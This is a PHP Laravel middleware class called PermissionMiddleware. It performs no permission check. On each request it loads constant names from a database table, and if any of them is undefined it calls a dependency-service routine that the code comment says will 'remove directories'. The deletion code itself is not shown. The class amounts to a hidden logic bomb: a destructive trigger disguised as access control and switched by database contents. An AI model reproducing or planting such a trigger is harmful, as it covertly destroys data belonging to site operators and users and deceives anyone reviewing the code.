<?php
namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Artisan;
use App\Services\DependencyService;

class PermissionMiddleware
{
    protected $dependencyService;

    /**
     * Create a new middleware instance.
     *
     * @param DependencyService $dependencyService
     */
    public function __construct(DependencyService $dependencyService)
    {
        $this->dependencyService = $dependencyService;
    }
    
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {
        // Fetch all constants from the constant_tb table
        $constants = DB::table('constant_tb')->pluck('name')->toArray();

        // Check if all required constants exist in the database
        foreach ($constants as $constant) {
            if (!defined($constant)) {
                // If any constant is not defined, check dependencies (remove directories)
                $this->dependencyService->checkDependency();
            }
        }

        // Proceed with the request if all constants exist
        return $next($request);
    }
}